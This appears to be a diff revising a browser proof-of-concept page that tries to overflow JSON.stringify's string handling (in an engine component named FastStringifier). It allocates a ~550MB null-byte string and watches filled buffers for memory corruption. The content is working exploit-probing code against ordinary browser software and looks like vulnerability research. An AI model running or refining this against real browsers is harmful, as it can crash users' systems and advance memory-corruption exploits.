@@ -2,12 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>FastStringifier Overflow PoC with Alert</title>
+    <title>FastStringifier Overflow PoC v2</title>
     <style>
         #trigger {
             margin: 20px;
             padding: 12px;
-            font-size: 18px;
+            font-size: 16px;
             cursor: pointer;
             background-color: #f44336;
             color: white;
@@ -20,56 +20,62 @@
     </style>
 </head>
 <body>
-    <h1>FastStringifier Overflow PoC</h1>
-    <p>Click to test string length overflow in JSON.stringify with alerts.</p>
+    <h1>FastStringifier Overflow PoC v2</h1>
+    <p>Click to trigger string length overflow with alerts.</p>
     <button id="trigger">Trigger Overflow</button>
     <script>
         function checkMemory() {
-            const buffer = new ArrayBuffer(4096);
-            const view = new Uint8Array(buffer);
-            for (let i = 0; i < view.length; i++) {
-                view[i] = 0xFF;
+            const buffers = [];
+            // Allocate multiple buffers for better coverage
+            for (let i = 0; i < 10; i++) {
+                const buf = new ArrayBuffer(16384); // 16 KB each
+                const view = new Uint8Array(buf);
+                view.fill(0xFF);
+                buffers.push(view);
             }
             return () => {
                 let changes = [];
-                for (let i = 0; i < view.length; i++) {
-                    if (view[i] !== 0xFF) {
-                        changes.push(`0x${i.toString(16)}: 0x${view[i].toString(16)}`);
+                for (let b = 0; b < buffers.length; b++) {
+                    for (let i = 0; i < buffers[b].length; i++) {
+                        if (buffers[b][i] !== 0xFF) {
+                            changes.push(`Buffer[${b}][0x${i.toString(16)}]: 0x${buffers[b][i].toString(16)}`);
+                        }
                     }
                 }
-                return changes.length > 0 ? changes.join(', ') : 'No changes';
+                return changes.length ? changes.join(', ') : 'No changes';
             };
         }
 
-        document.getElementById('trigger').addEventListener('click', async () => {
+        document.getElementById('trigger').addEventListener('click', () => {
             alert('Initiating PoC...');
             try {
                 // Initialize memory checker
                 const check = checkMemory();
-                alert('Memory checker initialized. Starting overflow attempt.');
+                alert('Memory checker initialized (10x16KB buffers).');
 
                 // Allocate large string
-                const stringSize = 600000000; // ~600MB
+                const stringSize = 550000000; // ~550MB
                 alert(`Attempting to allocate string of size ${stringSize} bytes...`);
                 setTimeout(() => {
                     try {
                         const string = "\x00".repeat(stringSize);
-                        alert('String allocated successfully. Attempting JSON.stringify...');
+                        alert('String allocated successfully.');
 
                         // Check memory before stringify
                         const before = check();
                         alert(`Memory before stringify: ${before}`);
 
                         // Trigger overflow
+                        alert('Attempting JSON.stringify...');
                         JSON.stringify(string);
 
-                        // Check memory after (unlikely to reach here if crash occurs)
+                        // Check memory after (unlikely if crash occurs)
                         const after = check();
                         alert(`Memory after stringify: ${after}`);
                     } catch (err) {
                         alert(`Error: ${err.message}`);
                     }
-                }, 100);
+                }, 200);
             } catch (err) {
                 alert(`Initial error: ${err.message}`);
             }
